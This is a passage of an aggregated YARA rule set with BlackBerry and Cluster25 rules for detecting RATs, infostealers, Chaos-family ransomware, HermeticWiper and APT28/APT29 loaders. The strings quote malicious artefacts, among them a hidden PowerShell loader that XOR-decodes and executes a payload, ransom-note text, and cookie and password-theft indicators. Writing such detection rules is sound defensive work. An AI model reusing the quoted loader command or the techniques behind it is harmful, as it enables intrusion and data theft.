	condition:
		( uint16( 0 ) == 0x5a4d and all of ( $s* ) )
}
rule BLACKBERRY_Boratratinformation : FILE
{
	meta:
		description = "Detects BoratRAT Information Module"
		author = "BlackBerry Threat Research Team"
		id = "2bd2ec00-3aa5-5f41-9e5b-713398a35b4a"
		date = "2022-04-13"
		modified = "2022-07-07"
		reference = "https://blogs.blackberry.com/en/2022/04/threat-thursday-boratrat"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Blackberry/BoratRATInformation.yar#L1-L45"
		license_url = "N/A"
		logic_hash = "17545a0834e339039361802a6d675303a975b9de013620068f1a516e49e3138f"
		score = 75
		quality = 85
		tags = "FILE"
		license = "This Yara rule is provided under the Apache License 2.0 (https://www.apache.org/licenses/LICENSE-2.0) and open to any user or organization, as long as you use it under this license and ensure originator credit in any derivative to The BlackBerry Research & Intelligence Team"

	strings:
		$s1 = "set_UseShellExecute"
		$s2 = "execCMD"
		$s3 = "hostname" wide
		$s4 = "ipconfig" wide
		$s5 = "tasklist" wide
		$s6 = "arp -a" wide
		$sp = {43 3A 5C 55 73 65 72 73 5C 41 64 6D 69 6E 69 

                   73 74 72 61 74 6F 72 5C 44 6F 77 6E 6C 6F 61 

                   64 73 5C 53 61 6E 74 61 52 61 74 2D 6D 61 69 

                   6E 5C 42 69 6E 61 72 69 65 73 5C 52 65 6C 65  

                   61 73 65 5C 50 6C 75 67 69 6E 73 5C 49 6E 66 

                   6F 72 6D 61 74 69 6F 6E 2E 70 64 62}

	condition:
		uint16( 0 ) == 0x5a4d and all of them
}

rule BLACKBERRY_Mal_Infostealer_Win32_Blackguard : FILE
{
	meta:
		description = "Detects W32 BlackGuard Infostealer"
		author = "BlackBerry Threat Research team "
		id = "e079de0f-c607-5089-b385-ba67ed2cb73e"
		date = "2022-04-14"
		modified = "2022-07-06"
		reference = "https://blogs.blackberry.com/en/2022/04/threat-thursday-blackguard-infostealer"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Blackberry/Mal_Infostealer_Win32_BlackGuard.yar#L3-L39"
		license_url = "N/A"
		hash = "6ab3b21fa7cb638ed68509be1ed6302284e8a9cd1a10f9b6837c057154aa6162"
		logic_hash = "6e819ee656b6d696be1e818eeb8a545e7934c1f5a1171a1192422d8c74c0caa2"
		score = 75
		quality = 85
		tags = "FILE"
		license = "This Yara rule is provided under the Apache License 2.0 (https://www.apache.org/licenses/LICENSE-2.0) and open to any user or organization, as long as you use it under this license and ensure originator credit in any derivative to The BlackBerry Research & Intelligence Team"

	strings:
		$a1 = { 06 91 06 61 20 AA 00 00 00 61 D2 9C 06 17 58 0A }
		$a2 = "System.Data.SQLite"
		$a3 = "FromBase64String"
		$a4 = "BlockInput"
		$a5 = "UploadFile"
		$a6 = "Passwords"
		$a7 = "Discord"
		$a8 = "GetVolumeInformationA"
		$a9 = "NordVPN"
		$a10 = "OpenVPN"
		$a11 = "ProtonVPN"
		$a12 = "OperaCookies"
		$a13 = "EdgeCookies"
		$a14 = "ChromeCookies"
		$b1 = "upche" wide

	condition:
		uint16( 0 ) == 0x5a4d and pe.imphash ( ) == "f34d5f2d4577ed6d9ceec516c1f5a744" and pe.number_of_sections == 3 and pe.section_index ( ".text" ) == 0 and pe.section_index ( ".rsrc" ) == 1 and pe.section_index ( ".reloc" ) == 2 and ( ( all of ( $a* ) ) or ( ( 12 of ( $a* ) and all of ( $b* ) ) ) )
}
rule BLACKBERRY_Snake : FILE
{
	meta:
		description = "Detects Snake"
		author = "BlackBerry Threat Research Team"
		id = "a8169a4e-4acd-5e54-915f-af1ff7f4cb1a"
		date = "2022-06-03"
		modified = "2022-07-07"
		reference = "https://blogs.blackberry.com/en/2022/06/threat-thursday-unique-delivery-method-for-snake-keylogger"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Blackberry/Snake.yar#L1-L19"
		license_url = "N/A"
		logic_hash = "70ba9a649f9926fd204d45eafd42ce639811552c132b743367d2ba8ebaf3ee63"
		score = 75
		quality = 85
		tags = "FILE"
		license = "This Yara rule is provided under the Apache License 2.0 (https://www.apache.org/licenses/LICENSE-2.0) and open to any user or organization, as long as you use it under this license and ensure originator credit in any derivative to The BlackBerry Research & Intelligence Team"

	strings:
		$s1 = "Game1Screen_Form_Load"
		$s2 = "get_KeyCode"
		$s3 = "Good luck mate"

	condition:
		filesize < 1000KB and all of them
}
rule BLACKBERRY_Headertip : FILE
{
	meta:
		description = "Detects HeaderTip"
		author = "BlackBerry Threat Research Team"
		id = "8569fed8-0fa8-515a-8ca2-ca4c2a959bbe"
		date = "2022-04-06"
		modified = "2022-07-06"
		reference = "https://blogs.blackberry.com/en/2022/04/threat-thursday-headertip-backdoor-shows-attackers-from-china-preying-on-ukraine"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Blackberry/HeaderTip.yar#L1-L18"
		license_url = "N/A"
		logic_hash = "426c6ebd4ebf85cc4b13d47dc77ae2648fba2b0ccdb7eeaea6b96f19a46c2d4e"
		score = 75
		quality = 85
		tags = "FILE"
		license = "This Yara rule is provided under the Apache License 2.0 (https://www.apache.org/licenses/LICENSE-2.0) and open to any user or organization, as long as you use it under this license and ensure originator credit in any derivative to The BlackBerry Research & Intelligence Team"

	strings:
		$s1 = "type %temp%\\officecleaner.dat >> %objfile%"
		$s2 = "product2020.mrbasic.com" wide

	condition:
		filesize < 750KB and all of them
}

rule BLACKBERRY_Mal_Infostealer_Win32_Jupyter_Download_And_Execute_Module
{
	meta:
		description = "Detects Jupter download and execute module. Research has shown it downloading SolarDelphi / JupyterStealer."
		author = "BlackBerry Threat Research Team"
		id = "318b0327-b4b0-57a6-8a24-51320b1026ec"
		date = "2021-11-09"
		modified = "2022-07-06"
		reference = "https://blogs.blackberry.com/en/2022/01/threat-thursday-jupyter-infostealer-is-a-master-of-disguise"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Blackberry/Mal_Infostealer_Win32_Jupyter_Download_and_Execute_Module.yar#L4-L30"
		license_url = "N/A"
		logic_hash = "7491eeb06e88512711688a1baf6967e6b6bf80ad4937c16fd49059903cac35df"
		score = 75
		quality = 85
		tags = ""
		license = "This Yara rule is provided under the Apache License 2.0 (https://www.apache.org/licenses/LICENSE-2.0) and open to any user or organization, as long as you use it under this license and ensure originator credit in any derivative to The BlackBerry Research & Intelligence Team"

	strings:
		$e1 = { 68 00 74 00 74 00 70 00 3A 00 2F 00 2F 00 }
		$e2 = { 47 00 45 00 54 00 00 3D 63 00 3A 00 5C 00 77 00 69 00 6E 00 64 00 6F 00 77 00 73 00 5C 00 73 00 79 00 73 00 74 00 65 00 6D 00 33 00 32 00 5C 00 77 00 69 00 6E 00 76 00 65 00 72 00 2E 00 65 00 78 00 65 }
		$e3 = { 00 2F 00 67 00 65 00 74 00 2F 00 }
		$e4 = "FromBase64String"
		$e5 = "get_UTF8"
		$e6 = "WebResponse"
		$e7 = "GetResponse"
		$e8 = "Invoke"

	condition:
		pe.imports( "mscoree.dll" , "_CorDllMain" ) and dotnet.version == "v4.0.30319" and dotnet.assembly.version.major == 0 and dotnet.assembly.version.minor == 0 and all of ( $e* )
}
rule BLACKBERRY_Mal_Infostealer_MSI_Jupyter_Embedded_Powershell : FILE
{
	meta:
		description = "Detects Jupter by a specific PowerShell command present in the MSI Installer"
		author = "BlackBerry Threat Research Team"
		id = "feee2c1d-b6c5-5a79-a409-c2add83dc68f"
		date = "2021-10-14"
		modified = "2022-07-06"
		reference = "https://blogs.blackberry.com/en/2022/01/threat-thursday-jupyter-infostealer-is-a-master-of-disguise"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Blackberry/Mal_Infostealer_MSI_Jupyter_Embedded_PowerShell.yar#L1-L20"
		license_url = "N/A"
		logic_hash = "7528342e5aea1c35b59a458695c0e363c6d6c6e1c2df38614ff185c74085ac89"
		score = 75
		quality = 85
		tags = "FILE"
		license = "This Yara rule is provided under the Apache License 2.0 (https://www.apache.org/licenses/LICENSE-2.0) and open to any user or organization, as long as you use it under this license and ensure originator credit in any derivative to The BlackBerry Research & Intelligence Team"

	strings:
		$msi = { D0 CF 11 E0 A1 B1 1A E1 }
		$x1 = /powershell-ep bypass -windowstyle hidden -command \"\$xp=\'\[AppDataFolder\]pd\w*\.(log|txt)\';\$xk=\'[a-zA-Z]{52}\';\$xb=\[\\\[\]System\.Convert\[\\\]\]::FromBase64String\(\[\\\[\]System\.IO\.File\[\\\]\]::ReadAllText\(\$xp\)\);remove-item \$xp;for\(\$i=0;\$i -lt \$xb.count;\)\[\\\{\]for\(\$j=0;\$j -lt \$xk\.length;\$j\+\+\)\[\\\{\]\$xb\[\\\[\]\$i\[\\\]\]=\$xb\[\\\[\]\$i\[\\\]\] -bxor \$xk\[\\\[\]\$j\[\\\]\];\$i\+\+;if\(\$i -ge \$xb.count\)\[\\\{\]\$j=\$xk\.length;\[\\\}\]\[\\\}\]\[\\\}\];\$xb=\[\\\[\]System.Text.Encoding\[\\\]\]::UTF8\.GetString\(\$xb\);iex \$xb;/ nocase

	condition:
		$msi at 0 and all of ( $x* )
}
rule BLACKBERRY_Mal_Win32_Chaos_Builder_Ransomware_2022 : FILE
{
	meta:
		description = "Detects Chaos Ransomware Builder"
		author = "BlackBerry Threat Research"
		id = "53c812da-802c-5116-89aa-455d1a20a179"
		date = "2022-05-10"
		modified = "2022-07-08"
		reference = "https://blogs.blackberry.com/en/2022/05/yashma-ransomware-tracing-the-chaos-family-tree"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Blackberry/Mal_Win32_Chaos_Builder_Ransomware_2022.yar#L4-L44"
		license_url = "N/A"
		logic_hash = "32b68ef2f6e011255080f2666170a4fad42c6a8dd28a05c1a58936dcd27084ec"
		score = 75
		quality = 85
		tags = "FILE"
		license = "This Yara rule is provided under the Apache License 2.0 (https://www.apache.org/licenses/LICENSE-2.0) and open to any user or organization, as long as you use it under this license and ensure originator credit in any derivative to The BlackBerry Research & Intelligence Team"

	strings:
		$s0 = "1qw0ll8p9m8uezhqhyd" ascii wide
		$s1 = "Chaos Ransomware Builder" ascii wide
		$s2 = "payloadFutureName" ascii wide
		$s3 = "read_it.txt" ascii wide
		$s4 = "encryptedFileExtension" ascii wide
		$x0 = "1098576" ascii wide
		$x1 = "2197152" ascii wide

	condition:
		uint16( 0 ) == 0x5a4d and ( ( all of ( $s* ) ) and ( 1 of ( $x* ) ) )
}

rule BLACKBERRY_Mal_Win32_Chaosransomware_2022 : FILE
{
	meta:
		description = "Detects Ransomware Built by Chaos Ransomware Builder"
		author = "BlackBerry Threat Research"
		id = "1fc57dd4-f020-5eb6-8e60-2bce3edfc512"
		date = "2022-05-10"
		modified = "2022-07-07"
		reference = "https://blogs.blackberry.com/en/2022/05/yashma-ransomware-tracing-the-chaos-family-tree"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Blackberry/Mal_Win32_ChaosRansomware_2022.yar#L3-L45"
		license_url = "N/A"
		logic_hash = "d466570965e22b1bb0f1ca30c725d553d7ccf9e25ce2b546f105002260b1d526"
		score = 75
		quality = 83
		tags = "FILE"
		license = "This Yara rule is provided under the Apache License 2.0 (https://www.apache.org/licenses/LICENSE-2.0) and open to any user or organization, as long as you use it under this license and ensure originator credit in any derivative to The BlackBerry Research & Intelligence Team"

	strings:
		$x1 = "Encrypt" ascii wide
		$x2 = "(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})" ascii wide
		$x3 = "read" ascii wide
		$r1 = { 20 76 69 72 75 73 }
		$r2 = { 72 00 61 00 6e 00 73 00 6f 00 6d 00 77 00 61 00 72 00 65 }
		$z0 = "deleteShadowCopies" ascii wide
		$z1 = "shadowcopy" ascii wide

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 35KB and pe.imphash ( ) == "f34d5f2d4577ed6d9ceec516c1f5a744" and pe.number_of_sections == 3 and ( ( all of ( $x* ) ) and ( 1 of ( $r* ) ) and ( 1 of ( $z* ) ) )
}
rule BLACKBERRY_Eternityclipper : FILE
{
	meta:
		description = "Detects Eternity Clipper"
		author = "BlackBerry Threat Research Team"
		id = "18aedf62-2062-5f3a-a4b2-6c647efcf85b"
		date = "2022-05-22"
		modified = "2022-07-07"
		reference = "https://blogs.blackberry.com/en/2022/06/threat-spotlight-eternity-project-maas-goes-on-and-on"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Blackberry/EternityClipper.yar#L4-L30"
		license_url = "N/A"
		logic_hash = "bb766a8bcb0f31babdc12ceac9bb56b8b6a25119ec713fe30b99ed975f4b7a39"
		score = 75
		quality = 85
		tags = "FILE"
		license = "This Yara rule is provided under the Apache License 2.0 (https://www.apache.org/licenses/LICENSE-2.0) and open to any user or organization, as long as you use it under this license and ensure originator credit in any derivative to The BlackBerry Research & Intelligence Team"

	strings:
		$s1 = "CopyFromScreen"
		$s2 = "CaptureDesktop"
		$s3 = "Win32Clipboard"
		$s4 = "Clipboard Manager"
		$s5 = "Eternity.exe" wide
		$s6 = "AddClipboardFormatListener"
		$s7 = "AesCryptoServiceProvider"

	condition:
		( uint16( 0 ) == 0x5a4d and all of ( $s* ) )
}
rule BLACKBERRY_Mal_Backdoor_Chachi_RAT : FILE
{
	meta:
		description = "ChaChi RAT used in PYSA Ransomware Campaigns"
		author = "BlackBerry Threat Research & Intelligence"
		id = "f0d531d3-585a-5194-ac30-fc62433d0ffc"
		date = "2022-07-07"
		modified = "2022-07-07"
		reference = "https://blogs.blackberry.com/en/2021/06/pysa-loves-chachi-a-new-golang-rat"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Blackberry/Mal_Backdoor_ChaChi_RAT.yar#L1-L25"
		license_url = "N/A"
		logic_hash = "b49f22ceb57a21716c05dcf264cc239596f3a076525d7416961ae1f38bcf25bd"
		score = 75
		quality = 77
		tags = "FILE"

	strings:
		$go = { 47 6F 20 62 75 69 6C 64 20 49 44 3A }
		$dnsStream = { 64 6E 73 53 74 72 65 61 6D }
		$socks5 = { 53 4F 43 4B 53 35 }
		$chisel = { 63 68 69 73 65 6C }

	condition:
		uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 and all of them
}

rule BLACKBERRY_Mal_Win32_Onyx_Strain_Chaos_Ransomware_2022 : FILE
{
	meta:
		description = "Detects Onyx Ransomware build off of Chaos Builder v4"
		author = "BlackBerry Threat Research"
		id = "8c30c316-9fd3-5ad9-aea1-d93229cd9ca1"
		date = "2022-05-10"
		modified = "2022-07-07"
		reference = "https://blogs.blackberry.com/en/2022/05/yashma-ransomware-tracing-the-chaos-family-tree"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Blackberry/Mal_Win32_Onyx_Strain_Chaos_Ransomware_2022.yar#L3-L28"
		license_url = "N/A"
		logic_hash = "2df2f36167710a4de4ff3fda8036472b1972b4175a0d14f8b06e0ad045eb5038"
		score = 75
		quality = 85
		tags = "FILE"
		license = "This Yara rule is provided under the Apache License 2.0 (https://www.apache.org/licenses/LICENSE-2.0) and open to any user or organization, as long as you use it under this license and ensure originator credit in any derivative to The BlackBerry Research & Intelligence Team"

	strings:
		$s1 = "(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})" wide
		$s2 = "All of your files are currently encrypted by ONYX strain." wide
		$s3 = "Inform your supervisors and stay calm!" wide

	condition:
		uint16( 0 ) == 0x5a4d and pe.data_directories [ pe.IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR ] . size != 0 and all of ( $s* )
}
/*
 * YARA Rule Set
 * Repository Name: Cluster25
 * Repository: https://github.com/mikesxrs/Open-Source-YARA-rules
 * Retrieval Date: 2026-11-22
 * Git Commit: ec0056f767db98bf6d5fd63877ad51fb54d350e9
 * Number of Rules: 8
 * Skipped: 0 (age), 2 (quality), 0 (score), 0 (importance)
 *
 * 
 * LICENSE
 * 
 * NO LICENSE SET
 */
rule CLUSTER25_Sidewinder_Apt_Rtf_Cve_2017_0199 : FILE
{
	meta:
		description = "No description has been set in the source file - Cluster25"
		author = "Cluster25"
		id = "0c44f22e-6b21-5dfb-9812-7d8d14e08c1a"
		date = "2021-09-09"
		modified = "2023-04-10"
		reference = "https://21649046.fs1.hubspotusercontent-na1.net/hubfs/21649046/a_rattlesnake_in_the_navy.pdf"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Cluster 25/sidewinder_apt_rtf_cve_2017_0199.yar#L2-L18"
		license_url = "N/A"
		hash = "282367417cdc711fbad33eb6988c172c61a9a57d9f926addaefabc36cac3c004"
		hash = "6d021166bdde0eab22fd4a9f398fdd8ccf8b977ff33a77c518f8d16e56d3eeee"
		logic_hash = "63c7b8c251a906ea9ea81a7ea838506cd2c0304b4d197eaff8cd3bac99f860ac"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$head = "{\\rtf1" ascii
		$obj = "objdata 0105000002000000" ascii
		$expl = "6D007300680074006D006C000000FFD7E8130000006E756E48544D4C4170706C69636174696F6E" ascii
		$s1 = "416374697665584F626A656374" ascii nocase
		$s2 = "5176524d384b4e4734504332565a55753765497764426f72686974366761416259796d356c4563306a4453576e585431334a7173467870484f666b7a4c392b2f3d" ascii nocase
		$s3 = "62203e3e2031362026203235352c2062203e3e20382026203235352c2062202620323535" ascii nocase

	condition:
		$head at 0 and $obj and $expl and 2 of ( $s* )
}
rule CLUSTER25_UNC1222_Hermeticwiper_23433_10001 : FILE
{
	meta:
		description = "Detects HermeticWiper variants by internal strings"
		author = "Cluster25"
		id = "5fe25bef-b0e8-5d0e-ac54-e2037cbec05e"
		date = "2022-02-23"
		modified = "2023-04-10"
		reference = "https://blog.cluster25.duskrise.com/2022/02/24/ukraine-analysis-of-the-new-disk-wiping-malware"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Cluster 25/UNC1222_HermeticWiper_23433_10001.yar#L1-L17"
		license_url = "N/A"
		hash = "0385eeab00e946a302b24a91dea4187c1210597b8e17cd9e2230450f5ece21da"
		hash = "1bc44eef75779e3ca1eefb8ff5a64807dbc942b1e4a2672d77b9f6928d292591"
		logic_hash = "bed91eb4bd1dfd20783cfd74111b0f120dc302eea6f06921139bbec2ee0bfc46"
		score = 75
		quality = 75
		tags = "FILE"
		tlp = "white"

	strings:
		$ = "tdrv.pdb" fullword ascii
		$ = "\\\\.\\EPMNTDRV\\%u" fullword wide
		$ = "PhysicalDrive%u" fullword wide
		$ = "Hermetica Digital Ltd"

	condition:
		( uint16( 0 ) == 0x5a4d and all of them )
}

rule CLUSTER25_APT28_Skinnyboy_Implanter : RUSSIAN THREAT ACTOR FILE
{
	meta:
		description = "No description has been set in the source file - Cluster25"
		author = "Cluster25"
		id = "c44faf95-a64c-58f4-97d4-2fe17aefc813"
		date = "2021-05-24"
		modified = "2023-04-10"
		reference = "https://21649046.fs1.hubspotusercontent-na1.net/hubfs/21649046/2021-05_FancyBear.pdf"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Cluster 25/APT28_SkinnyBoy_Implanter.yar#L2-L16"
		license_url = "N/A"
		hash = "ae0bc3358fef0ca2a103e694aa556f55a3fed4e98ba57d16f5ae7ad4ad583698"
		logic_hash = "f5b8944910297988ecf5aecf23d20c384cf141a3a0972baadfacc4969dc46e7c"
		score = 75
		quality = 75
		tags = "RUSSIAN, THREAT, ACTOR, FILE"

	strings:
		$enc_string = {F3 0F 7E 05 ?? ?? ?? ?? 6? [5] 6A ?? 66 [6] 66 [7] F3 0F 7E 05 ?? ?? ?? ?? 8D
85 [4] 6A ?? 50 66 [7] E8}
		$heap_ops = {8B [1-5] 03 ?? 5? 5? 6A 08 FF [1-6] FF ?? ?? ?? ?? ?? [0-6] 8B ?? [0-6] 8?}
		$xor_cycle = { 8A 8C ?? ?? ?? ?? ?? 30 8C ?? ?? ?? ?? ?? 42 3B D0 72 }

	condition:
		uint16( 0 ) == 0x5a4d and pe.is_dll ( ) and filesize < 100KB and $xor_cycle and $heap_ops and $enc_string
}

rule CLUSTER25_APT29_Loader_87221_00001 : FILE
{
	meta:
		description = "Detects DLL loader variants used in Nobelium kill-chain"
		author = "Cluster25"
		id = "cbee0268-d346-5246-9c2c-97a01ec2e0b3"
		date = "2023-04-10"
		modified = "2023-04-10"
		reference = "https://blog.cluster25.duskrise.com/2022/05/13/cozy-smuggled-into-the-box"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Cluster 25/APT29_Loader_87221_00001.yar#L2-L28"
		license_url = "N/A"
		hash = "6fc54151607a82d5f4fae661ef0b7b0767d325f5935ed6139f8932bc27309202"
		hash = "23a09b74498aea166470ea2b569d42fd661c440f3f3014636879bd012600ed68"
		logic_hash = "7de041baa35b6b07c11c5f08d456a717007ae356e35e296ec4288cf0293a1d7e"
		score = 75
		quality = 75
		tags = "FILE"
		tlp = "white"

	strings:
		$s1 = "%s\\blank.pdf" fullword ascii
		$s2 = "%s\\AcroSup" fullword ascii
		$s3 = "vcruntime140.dll" fullword ascii
		$s4 = "ME3.99.5UUUUUUUUUUU" fullword ascii
		$c1 = "Rock" fullword ascii
		$c2 = ".mp3" fullword ascii
		$c3 = "%s.backup" fullword ascii
		$sequence1 = { C7 45 ?? 0B 00 10 00 48 8B CF FF 15 ?? ?? ?? 00 85 C0 74 ?? 48 8D 55 ?? 48 89 75 ?? 48 8B CF FF 15 ?? ?? ?? 00 85 C0 74 ?? 48 8B CF FF 15 ?? ?? ?? 00 }
		$sequence2 = { 0F B6 0B 4C 8D 05 ?? ?? ?? 00 89 4C 24 ?? 4D 8B CD 49 8B CD BA 04 01 00 00 E8 ?? ?? ?? ?? 48 8D 5B 01 48 83 EF 01 75 ?? }
		$sequence3 = { 4C 8D 8C 24 ?? 00 00 00 8B 53 ?? 44 8D 40 ?? 48 03 CD 44 89 A4 24 ?? 00 00 00 FF 15 ?? ?? ?? 00 8B 43 ?? 44 8B 43 ?? 4A 8D 14 38 48 8D 0C 28 E8 ?? ?? 00 00 8B 4B ?? 4C 8D 8C 24 ?? 00 00 00 8B 53 ?? 48 03 CD 44 8B 84 24 ?? 00 00 00 FF 15 ?? ?? ?? 00 }
		$sequence4 = { 42 0F B6 8C 32 ?? ?? ?? 00 48 83 C2 03 88 0F 48 8D 7F 01 48 83 FA 2D 7C E7 }

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 200KB and pe.imports ( "kernel32.dll" , "SetThreadContext" ) and pe.imports ( "kernel32.dll" , "ResumeThread" ) and pe.imports ( "kernel32.dll" , "K32GetModuleFileNameExA" ) and 3 of ( $s* ) and all of ( $c* ) and 3 of ( $sequence* )
}
rule CLUSTER25_APT29_Htmlsmuggling_ZIP_82733_00001 : FILE
{
	meta:
		description = "Rule to detect the EnvyScout HTML smuggling with ZIP payload used in the APT29/Nobelium APT29 chain"
		author = "Cluster25"
		id = "edc2fc67-482f-594e-9b10-f738b9e34c4a"
		date = "2022-05-12"
		modified = "2023-04-10"
		reference = "https://blog.cluster25.duskrise.com/2022/05/13/cozy-smuggled-into-the-box"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Cluster 25/APT29_HTMLSmuggling_ZIP_82733_00001.yar#L1-L16"
		license_url = "N/A"
		hash = "d5c84cbd7dc70e71f3eb24434a58b2f149d0c39faa7e4157552b60c7dbb53d11"
		logic_hash = "ec51d08551af64100f0f22ef61470ea930be7a457c5aba84e8e00cd9b423616d"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "new Blob("
		$s2 = "new Uint8Array("
		$s3 = "application/octet-stream"
		$t1 = "saveAs("
		$t2 = "download("
		$r1 = { 66 6F 72 28 76 61 72 20 69 20 3D 20 30 78 30 3B 20 69 20 3C 20 64 5B 27 6C 65 6E 67 74 68 27 5D 3B 20 69 2B 2B 29 20 7B 0A 20 20 20 20 64 5B 69 5D 20 3D 20 64 5B 69 5D }

	condition:
		( filesize > 500KB and all of ( $s* ) and ( $t1 or $t2 ) and $r1 )
}
rule CLUSTER25_Ghostwriter_Microbackdoor_72632_00001 : FILE
{
	meta:
		description = "No description has been set in the source file - Cluster25"
		author = "Cluster25"
		id = "b50ca459-bb0b-567d-968c-772f73f22eb4"
		date = "2023-04-10"
		modified = "2023-04-10"
		reference = "https://blog.cluster25.duskrise.com/2022/03/08/ghostwriter-unc1151-adopts-microbackdoor-variants-in-cyber-operations-against-targets-in-ukraine"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Cluster 25/GhostWriter_MicroBackdoor_72632_00001.yar#L1-L15"
		license_url = "N/A"
		hash = "559d8e8f2c60478d1c057b46ec6be912fae7df38e89553804cc566cac46e8e91"
		logic_hash = "cb58d374036f0e52299adb2c7b6795a3610e9d3b29be041d4aa32b44b19a1680"
		score = 75
		quality = 75
		tags = "FILE"
		tlp = "white"

	strings:
		$ = "cmd.exe /C \"%s%s\"" fullword wide
		$ = "client.dll" fullword ascii
		$ = "ERROR: Unknown command" fullword ascii
		$ = " *** ERROR: Timeout occured" fullword ascii
		$ = "%s\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" fullword ascii
		$ = "MIIDazCCAlOgAwIBAgIUWOftflCclQXpmWMnL1ewj2F5Y1AwDQYJKoZIhvcNAQEL" fullword ascii

	condition:
		( uint16( 0 ) == 0x5a4d and all of them )
}
rule CLUSTER25_Ghostwriter_Microloader_72632_00001 : FILE
{
	meta:
		description = "No description has been set in the source file - Cluster25"
		author = "Cluster25"
		id = "f0e25fac-c5ff-53a7-874e-dcd5efee4ef1"
		date = "2023-04-10"
		modified = "2023-04-10"
		reference = "https://blog.cluster25.duskrise.com/2022/03/08/ghostwriter-unc1151-adopts-microbackdoor-variants-in-cyber-operations-against-targets-in-ukraine"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Cluster 25/GhostWriter_MicroLoader_72632_00001.yar#L1-L14"
		license_url = "N/A"
		hash = "e97f1d6ec1aa3f7c7973d57074d1d623833f0e9b1c1e53f81af92c057a1fdd72"
		logic_hash = "f4c22e6f16374e26c6b3d7bdf49dfac6e3daab6e8ac42045a107f68ce61ba2b1"
		score = 75
		quality = 75
		tags = "FILE"
		tlp = "white"

	strings:
		$ = "ajf09aj2.dll" fullword wide
		$ = "regsvcser" fullword ascii
		$ = "X l.dlT" fullword ascii
		$ = "rtGso9w|4" fullword ascii
		$ = "ajlj}m${<" fullword ascii

	condition:
		( uint16( 0 ) == 0x5a4d and all of them )
}
rule CLUSTER25_APT28_Skinnyboy_Launcher : RUSSIAN THREAT ACTOR FILE
{
	meta:
		description = "No description has been set in the source file - Cluster25"
		author = "Cluster25"
		id = "eaf4e8e5-cbec-5000-a2ff-31d1dac4c30f"
		date = "2023-04-10"
		modified = "2023-04-10"
		reference = "https://21649046.fs1.hubspotusercontent-na1.net/hubfs/21649046/2021-05_FancyBear.pdf"
		source_url = "https://github.com/mikesxrs/Open-Source-YARA-rules/blob/ec0056f767db98bf6d5fd63877ad51fb54d350e9/Cluster 25/APT28_SkinnyBoy_Launcher.yar#L1-L19"
		license_url = "N/A"
		hash = "2a652721243f29e82bdf57b565208c59937bbb6af4ab51e7b6ba7ed270ea6bce"
		logic_hash = "cbb7a6e0114a9556a99ab3f5601664f430b650b2de0b44fe0178a99f21082e8d"
		score = 75
		quality = 75
		tags = "RUSSIAN, THREAT, ACTOR, FILE"

	strings:
		$sha = {F4 EB 56 52 AF 4B 48 EE 08 FF 9D 44 89 4B D5 66 24 61 2A 15 1D 58 14 F9 6D 97
13 2C 6D 07 6F 86}
		$l1 = "CryptGetHashParam" ascii
		$l2 = "CryptCreateHash" ascii
		$l3 = "FindNextFile" ascii
		$l4 = "PathAddBackslashW" ascii
		$l5 = "PathRemoveFileSpecW" ascii
		$h1 = {50 6A 00 6A 00 68 0C 80 00 00 FF ?? ?? ?? FF 15 ?? ?? ?? ?? FF 15 ?? ?? ?? ?? 6A 00
56 ?? ?? ?? ?? 50 FF ?? ?? ?? FF 15 ?? ?? ?? ?? FF 15 ?? ?? ?? ??}
		$h2 = {8B 01 3B 02 75 10 83 C1 04 83 C2 04 83 EE 04 73 EF}

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 100KB and ( $sha or ( all of ( $l* ) and all of ( $h* ) ) )
}
/*
 * YARA Rule Set
 * Repository Name: Microsoft
 * Repository: https://github.com/mikesxrs/Open-Source-YARA-rules
 * Retrieval Date: 2026-11-22
 * Git Commit: ec0056f767db98bf6d5fd63877ad51fb54d350e9
 * Number of Rules: 1
 * Skipped: 20 (age), 0 (quality), 0 (score), 0 (importance)
 *
 * 
